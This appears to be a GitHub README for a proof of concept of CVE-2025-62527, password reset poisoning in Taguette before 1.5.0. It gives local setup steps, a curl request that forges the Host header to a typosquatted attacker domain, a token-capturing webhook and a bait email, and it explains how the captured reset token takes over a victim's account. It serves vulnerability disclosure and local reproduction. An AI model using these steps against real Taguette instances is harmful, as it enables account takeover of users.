# CVE_2025_62527_PoC

![Demo screenshot](https://github.com/user-attachments/assets/6632d1ec-3b92-46ea-9b45-1d2b6fb02ce8)

---

## TL;DR

The password reset functionality in Taguette is vulnerable to a poisoning attack, where an attacker can order a password reset link for a victim while supplying an arbitrary hostname in the Host header, which will then be used as the hostname for the link. When the victim clicks the link (or, more realistically, an email security scanning tool in their network opens the link), the reset token is sent to the attacker. 

More information about this type of attack can be found here: https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning

This repo demonstrates how to reproduce the issue locally and capture a poisoned reset token.
---

## Overview

* **Vulnerability:** Password reset link poisoning (uses `Host` header when building reset links)
* **Affected versions:** Taguette < 1.5.0
* **Disclosed:** October 20, 2025
* **Reference:** GitHub Security Advisory — `GHSA-7rc8-5c8q-jr6j`.
  (See upstream advisory for full details and patches.)

---

## What this PoC does

1. Installs Taguette v1.4.1 locally.
2. Runs a local SMTP viewer (MailHog) to collect outgoing emails.
3. Posts a password reset request to the Taguette server while forcing a malicious `Host` header (typosquatted domain), causing the reset email to contain a link that points to the attacker domain.
4. The attacker collects the reset link (with the `reset_token`) and uses it to change the victim’s password.

---

## Setup

```bash
git clone https://github.com/Mitchellzhou1/CVE_2025_62527_PoC.git
cd CVE_2025_62527_PoC

# create virtualenv and install target Taguette version
python3 -m venv taguette.virtualenv
. taguette.virtualenv/bin/activate
pip install taguette==1.4.1

# create an empty SQLite DB file for Taguette to use
touch taguette.db

# download MailHog (local SMTP viewer) download your correct version:
#x86_64 version
wget https://github.com/mailhog/MailHog/releases/latest/download/MailHog_linux_amd64
chmod +x MailHog_linux_amd64
```

if you have ARM use:
```
wget https://github.com/mailhog/MailHog/releases/latest/download/MailHog_linux_arm64
chmod +x MailHog_linux_arm64
```


> **Optional:** For this demo I commented out Taguette’s email rate limiter so repeated resets are allowed. To apply locally:

```bash
# copy modified views.py into the virtualenv site-packages
cp views.py ./taguette.virtualenv/lib/python3.13/site-packages/taguette/web/views.py
```

> **Optional (typosquat hostname):**

```bash
echo "127.0.0.1 taguete" | sudo tee -a /etc/hosts
```

---

## Run the demo

1. Start Taguette:

```bash
taguette --no-browser server config.py
```

* default URL: `http://localhost:7465/`

2. Register a test user (example used in the PoC):

* Login: `john`
* Password: `12345`
* Email: `john@gmail.com`

3. Start MailHog (capture outgoing email):

```bash
./MailHog_linux_amd64
# MailHog UI: http://0.0.0.0:8025/
```

4. Run the PoC webhook to capture clicks:

```bash
python3 webhook.py
```

5. (Optional) Send a bait email so the victim expects something:

```bash
python3 first_email.py
```

<img width="846" height="370" alt="image" src="https://github.com/user-attachments/assets/5fd1b05a-68bc-48d0-81f7-ed2efc4fb99e" />


---

## Trigger the poisoned reset email

Forge the `Host` header so Taguette composes a reset link using the attacker domain.

**Example `curl` request (forges Host header to `taguete.com` — a typosquatted attacker domain):**

you can get the xsrf token by `inspect element`
<img width="671" height="45" alt="image" src="https://github.com/user-attachments/assets/29ec556d-36c2-4153-9c90-ac1d5b752d51" />

```bash
curl -i -X POST 'http://127.0.0.1:7465/reset_password' \
  -H 'Host: taguete.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: _xsrf=<valid_xsrf_cookie_value>' \
  --data-urlencode "_xsrf=<valid_xsrf_cookie_value>" \
  --data-urlencode "email=john@gmail.com"
```

**Notes:**

* Tornado’s XSRF protection requires the `_xsrf` cookie value to match the `_xsrf` POST field. Get a valid `_xsrf` by visiting the site (or capture it from a browser session).

After sending the request, check MailHog. The reset email will contain a link whose host is `taguete.com` (the attacker domain). When the victim clicks that link, the attacker (listening on `taguete.com`) can capture the `reset_token` parameter; the PoC webhook collects it.

---

## Using the captured token

Once you have the token (captured by the webhook), open the legitimate Taguette reset endpoint and pass the token:

```
http://localhost:7465/new_password?reset_token=<captured_token>
```

This opens the Set New Password form and allows the attacker to set a new password for the victim account.
<img width="778" height="436" alt="Screenshot from 2025-11-01 01-09-27" src="https://github.com/user-attachments/assets/74f70f0a-df2a-401f-a0ef-5da78ff35324" />


---

## Example screenshots

* Outgoing email as generated by Taguette showing the attacker host (MailHog):
  ![MailHog poisoned email](https://github.com/user-attachments/assets/2862ea70-d69f-42bf-951d-1ee7df6643f8)

* Legitimate email should have contained `localhost:7465`:
  ![Legit reset link example](https://github.com/user-attachments/assets/8eff466d-486e-4aeb-a01a-ded50341f49f)

* Webhook capture of the victim clicking the poisoned link:
  ![Webhook capture](https://github.com/user-attachments/assets/0c926d28-b0bd-4f16-9ad4-ba7c1607f00e)

---

## Root cause

Taguette used the request `Host` header (`request.host`) when building absolute URLs in outgoing password-reset emails. If an attacker can control the `Host` header or exploit a typo in the recipient’s DNS (typosquatting), the reset email can point to an attacker-controlled domain.

## Sources:
https://github.com/remram44/taguette/security/advisories/GHSA-7rc8-5c8q-jr6j

https://gitlab.com/remram44/taguette/-/issues/331
